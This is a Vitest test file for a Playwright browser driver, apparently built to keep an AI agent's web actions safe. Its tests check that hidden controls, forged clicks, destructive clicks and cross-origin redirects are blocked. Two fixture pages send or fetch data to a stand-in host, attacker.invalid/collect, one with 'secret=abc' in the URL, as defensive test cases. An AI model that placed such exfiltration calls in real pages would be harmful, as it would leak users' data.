import { chromium } from "@playwright/test";
import { mkdtemp, rm, stat } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import { afterEach, beforeAll, describe, expect, it } from "vitest";
import { createServer } from "node:http";
import { createPlaywrightDriver } from "../src/index.mjs";

let browserAvailable = false;
const cleanup = [];

beforeAll(async () => {
  try {
    const browser = await chromium.launch();
    await browser.close();
    browserAvailable = true;
  } catch {
    browserAvailable = false;
  }
});

afterEach(async () => {
  await Promise.all(cleanup.splice(0).map((item) => item()));
});

describe("playwright behavioral driver", () => {
  it("isolates BrowserContexts per session and writes traces", async () => {
    if (!browserAvailable) return;
    const app = await serve(`<button id="set" onclick="localStorage.setItem('seen','yes')">Set</button><button id="read" onclick="document.body.dataset.seen=localStorage.getItem('seen')||'no'">Read</button>`);
    const driver = createPlaywrightDriver({ browserType: chromium });
    const dir = await tempDir();
    const first = await driver.start(input("s1", app.url, path.join(dir, "s1"), { allowClick: true }));
    const second = await driver.start(input("s2", app.url, path.join(dir, "s2"), { allowClick: true }));

    const firstObservation = await driver.observe(first);
    await driver.execute(first, { type: "click", elementId: firstObservation.semantic.interactiveElements.find((item) => item.name === "Set").id, reasonCode: "set_storage" });
    const secondObservation = await driver.observe(second);
    await driver.execute(second, { type: "click", elementId: secondObservation.semantic.interactiveElements.find((item) => item.name === "Read").id, reasonCode: "read_storage" });

    await driver.close(first);
    await driver.close(second);
    expect(await stat(path.join(dir, "s1", "trace.zip"))).toMatchObject({ size: expect.any(Number) });
    expect(await stat(path.join(dir, "s2", "trace.zip"))).toMatchObject({ size: expect.any(Number) });
    await app.close();
    cleanup.push(() => rm(dir, { recursive: true, force: true }));
  });

  it("does not expose hidden or occluded controls and blocks forged hidden clicks", async () => {
    if (!browserAvailable) return;
    const app = await serve(`<button style="display:none">Hidden Pay</button><button id="covered" style="position:absolute;left:20px;top:20px">Covered</button><div style="position:absolute;left:0;top:0;width:200px;height:100px;background:white">Overlay</div><button style="position:absolute;left:20px;top:140px">Safe</button>`);
    const driver = createPlaywrightDriver({ browserType: chromium });
    const dir = await tempDir();
    const handle = await driver.start(input("hidden", app.url, dir, { allowClick: true }));
    const observation = await driver.observe(handle);
    expect(observation.semantic.interactiveElements.map((item) => item.name)).toEqual(["Safe"]);
    expect(observation.semantic.interactiveElements[0]).not.toHaveProperty("selector");
    const safeClick = await driver.execute(handle, { type: "click", elementId: observation.semantic.interactiveElements[0].id, reasonCode: "safe_visible_click" });
    expect(safeClick).toMatchObject({ status: "success" });
    await driver.observe(handle);
    const result = await driver.execute(handle, { type: "click", elementId: "el_999", reasonCode: "forged" });
    expect(result).toMatchObject({ status: "blocked", message: "Element was not in the latest perceived observation" });
    await driver.close(handle);
    await app.close();
    cleanup.push(() => rm(dir, { recursive: true, force: true }));
  });

  it("blocks destructive clicks and cross-origin redirects", async () => {
    if (!browserAvailable) return;
    const app = await serve(`<button onclick="location.href='https://attacker.invalid/collect?secret=abc'">Continue</button><button>Delete account</button>`);
    const driver = createPlaywrightDriver({ browserType: chromium });
    const dir = await tempDir();
    const handle = await driver.start(input("safety", app.url, dir, { allowClick: true, stopBeforeConfirmation: true }));
    const observation = await driver.observe(handle);
    const del = await driver.execute(handle, { type: "click", elementId: observation.semantic.interactiveElements.find((item) => item.name === "Delete account").id, reasonCode: "confirm_delete" });
    expect(del).toMatchObject({ status: "blocked", message: "Destructive confirmation/payment action blocked" });
    const freshObservation = await driver.observe(handle);
    const redirect = await driver.execute(handle, { type: "click", elementId: freshObservation.semantic.interactiveElements.find((item) => item.name === "Continue").id, reasonCode: "primary_action" });
    expect(redirect).toMatchObject({ status: "blocked" });
    expect(redirect.message).not.toContain("abc");
    await driver.close(handle);
    await app.close();
    cleanup.push(() => rm(dir, { recursive: true, force: true }));
  });

  it("collects semantic screenshot evidence plus console, HTTP, and request failure issues", async () => {
    if (!browserAvailable) return;
    const app = await serve(`<script>console.error('broken widget'); fetch('/missing'); fetch('https://attacker.invalid/collect').catch(()=>{});</script><h1>Hello</h1><button>Start</button>`);
    const driver = createPlaywrightDriver({ browserType: chromium });
    const dir = await tempDir();
    const handle = await driver.start(input("evidence", app.url, dir, { allowClick: true }));
    const observation = await driver.observe(handle);
    expect(observation.visual.screenshotEvidenceId).toContain("screenshot");
    expect(observation.semantic.headings[0]).toMatchObject({ text: "Hello" });
    expect(observation.runtime.consoleIssues.some((item) => item.message.includes("broken widget"))).toBe(true);
    expect(observation.runtime.networkFailures.some((item) => ["HTTP_STATUS", "REQUEST_FAILED", "ORIGIN_BLOCKED"].includes(item.severity))).toBe(true);
    await driver.close(handle);
    await app.close();
    cleanup.push(() => rm(dir, { recursive: true, force: true }));
  });
});

function input(sessionId, baseUrl, evidenceDir, safetyPolicy) {
  return {
    sessionId,
    evidenceDir,
    environment: { baseUrl, allowedOrigins: [baseUrl], viewport: { width: 390, height: 844 } },
    stabilization: { domQuietMs: 25, maxWaitMs: 500 },
    safetyPolicy,
  };
}

async function tempDir() {
  return mkdtemp(path.join(tmpdir(), "playwright-driver-"));
}

async function serve(html) {
  const server = createServer((request, response) => {
    if (request.url === "/missing") {
      response.writeHead(500, { "content-type": "text/plain" });
      response.end("missing");
      return;
    }
    response.writeHead(200, { "content-type": "text/html" });
    response.end(html);
  });
  await new Promise((resolve) => server.listen(0, "127.0.0.1", resolve));
  const { port } = server.address();
  return { url: `http://127.0.0.1:${port}/`, close: () => new Promise((resolve) => server.close(resolve)) };
}
